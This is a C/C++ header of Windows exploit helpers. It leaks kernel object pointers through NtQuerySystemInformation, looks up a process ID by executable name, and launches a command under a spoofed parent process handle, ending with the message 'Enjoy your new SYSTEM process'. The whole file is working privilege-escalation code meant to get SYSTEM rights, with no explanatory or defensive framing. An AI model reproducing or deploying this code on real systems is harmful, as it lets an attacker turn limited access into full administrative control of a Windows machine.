#pragma once
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

#define MAXIMUM_FILENAME_LENGTH 255 

typedef struct _SYSTEM_HANDLE
{
	PVOID Object;
	HANDLE UniqueProcessId;
	HANDLE HandleValue;
	ULONG GrantedAccess;
	USHORT CreatorBackTraceIndex;
	USHORT ObjectTypeIndex;
	ULONG HandleAttributes;
	ULONG Reserved;
} SYSTEM_HANDLE, * PSYSTEM_HANDLE;

typedef struct _SYSTEM_HANDLE_INFORMATION_EX
{
	ULONG_PTR HandleCount;
	ULONG_PTR Reserved;
	SYSTEM_HANDLE Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX, * PSYSTEM_HANDLE_INFORMATION_EX;

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemExtendedHandleInformation = 64
} SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS(WINAPI* PNtQuerySystemInformation)(
	__in SYSTEM_INFORMATION_CLASS SystemInformationClass,
	__inout PVOID SystemInformation,
	__in ULONG SystemInformationLength,
	__out_opt PULONG ReturnLength
	);

PVOID GetKernelPointerByHandle(HANDLE HandleValue)
{
	HMODULE ntdll = GetModuleHandle(TEXT("ntdll"));
	PNtQuerySystemInformation query = (PNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
	if (query == NULL) {
		printf("GetProcAddress() failed.\n");
		return 0;
	}
	ULONG len = 20;
	NTSTATUS status = (NTSTATUS)0xc0000004;
	PSYSTEM_HANDLE_INFORMATION_EX pHandleInfo = NULL;
	do {
		len *= 2;
		pHandleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)GlobalAlloc(GMEM_ZEROINIT, len);

		status = query(SystemExtendedHandleInformation, pHandleInfo, len, &len);

	} while (status == (NTSTATUS)0xc0000004);
	if (status != (NTSTATUS)0x0) {
		printf("NtQuerySystemInformation failed with error code 0x%X\n", status);
		return 0;
	}

	DWORD CurrentPid = GetCurrentProcessId();
	for (int i = 0; i < pHandleInfo->HandleCount; i++) {
		PVOID object = pHandleInfo->Handles[i].Object;
		HANDLE handle = pHandleInfo->Handles[i].HandleValue;
		HANDLE pid = pHandleInfo->Handles[i].UniqueProcessId;
		
		if ((DWORD)pid == CurrentPid && handle == HandleValue) {
			printf("Found object!\n");
			return object;
		}

	}
	return 0;
}

ULONG GetPidByName(const wchar_t* procname) {
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    ULONG pid;

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (Process32First(snapshot, &entry) == TRUE)
    {
        while (Process32Next(snapshot, &entry) == TRUE)
        {
            if (wcscmp(entry.szExeFile, procname) == 0)
            {
                pid = entry.th32ProcessID;
                break;
            }
        }
    }

    CloseHandle(snapshot);
    return pid;
}

//
// original from https://gist.github.com/xpn/a057a26ec81e736518ee50848b9c2cd6
//
DWORD CreateProcessFromHandle(HANDLE Handle, LPSTR command) {
	STARTUPINFOEXA si;
	PROCESS_INFORMATION pi;
	SIZE_T size;
	BOOL ret;

	// Create our PROC_THREAD_ATTRIBUTE_PARENT_PROCESS attribute
	ZeroMemory(&si, sizeof(STARTUPINFOEXA));

	InitializeProcThreadAttributeList(NULL, 1, 0, &size);
	si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
		GetProcessHeap(),
		0,
		size
	);
	InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
	UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &Handle, sizeof(HANDLE), NULL, NULL);

	si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

	// Finally, create the process
	ret = CreateProcessA(
		NULL,
		command,
		NULL,
		NULL,
		true,
		EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE,
		NULL,
		NULL,
		reinterpret_cast<LPSTARTUPINFOA>(&si),
		&pi
	);

	if (ret == false) {
		printf("Error creating new process (%d)\n", GetLastError());
		return 3;
	}

	printf("Enjoy your new SYSTEM process\n");
	return 0;
}